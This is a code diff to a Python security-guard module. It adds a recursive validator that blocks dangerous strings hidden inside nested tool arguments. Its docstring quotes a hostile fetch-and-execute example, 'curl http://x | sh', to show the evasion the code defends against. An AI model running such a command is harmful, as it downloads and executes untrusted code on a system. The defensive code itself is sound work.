@@ -15,6 +15,7 @@ from __future__ import annotations
 import json
 import re
 from datetime import datetime, timezone
+from typing import Any
 
 from lib.exceptions import PayloadGuardError
 from lib.paths import REPO_ROOT
@@ -153,6 +154,35 @@ def assert_payload_allowed(payload: str) -> None:
     allowed, reason = validate_payload(payload)
     if not allowed:
         raise PayloadGuardError(f"payload blocked by security boundary: {reason}")
+
+
+def _iter_strings(value: Any):
+    """Yield every string reachable in a nested dict/list/tuple/set."""
+    if isinstance(value, str):
+        yield value
+    elif isinstance(value, dict):
+        for item in value.values():
+            yield from _iter_strings(item)
+    elif isinstance(value, (list, tuple, set)):
+        for item in value:
+            yield from _iter_strings(item)
+
+
+def validate_payload_tree(value: Any) -> tuple[bool, str]:
+    """Validate every string reachable inside a structured payload.
+
+    Structured tool arguments can hide a blocked payload inside an object or
+    list value — e.g. ``{"options": {"cmd": "curl http://x | sh"}}`` — so a
+    top-level-only scan would forward it unchecked. Recursing here keeps the
+    safety boundary independent of how deeply a caller nests its arguments and
+    of whether the tool's JSON Schema declares nested properties (it usually
+    does not). Fails closed on the first violation.
+    """
+    for item in _iter_strings(value):
+        allowed, reason = validate_payload(item)
+        if not allowed:
+            return False, reason
+    return True, "payload tree within boundary"
 
 
 def validate_tool_command(cmd: list[str]) -> tuple[bool, str]:
